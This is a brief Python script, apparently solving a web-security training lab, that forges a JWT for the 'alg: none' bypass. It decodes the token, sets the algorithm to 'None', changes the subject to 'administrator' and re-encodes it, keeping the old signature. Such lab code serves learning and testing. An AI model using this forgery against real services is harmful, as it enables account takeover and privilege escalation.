import base64
import json

def base64_decode(b64):
	decode = base64.b64decode(b64 + '='*(len(b64)%4)).decode()
	return json.loads(decode)

def base64_encode(string):
	raw_string = json.dumps(string)
	b64 = base64.b64encode(raw_string.encode())
	return b64.decode().split('=')[0]

jwt = "eyJraWQiOiI4OTYwZmZiZS1kYzkwLTRmZDEtOGYxYy0zMTRmOTZlN2M2MGQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2ODk1ODk1M30.tWxBlXa8rDJ666KW-whc8HudaQ0yjtL4DFBQEBegEoZFlGn0qlBKgvG9G19w0DVnJPbqhnLakiNjfl23T3KjzOKFRdMH6lSLwuOJRmb353d4bonMNQJp0n6MFUwfzP6S0LrQduLjVYD2fzZpSH74XQrGa-ALzBSZAz5419PfZB7ZrltDwNF1koAGf8UeDIqFw99TEbHwpec6pcY2BKXfFtwhURem_ciJ3Rl6iTVt2vXtryY20_TepXRPqod2ef1G8moSg5NiAwKtkmOTXdUwV2YxeUp1p1d3KewZw6Nau0fWY8ewFPvj_hAcA9PW61KXjzAU6dMtF-36F6Gzj-L7dQ"
header, payload, sig = jwt.split('.')

header_decode = base64_decode(header)
payload_decode = base64_decode(payload)

print(header_decode)
print(payload_decode)

header_decode['alg'] = 'None'
payload_decode['sub'] = 'administrator'

print(header_decode)
print(payload_decode)

header_encode = base64_encode(header_decode)
payload_encode = base64_encode(payload_decode)

print('*'*50)
print(f"{header_encode}.{payload_encode}.{sig}")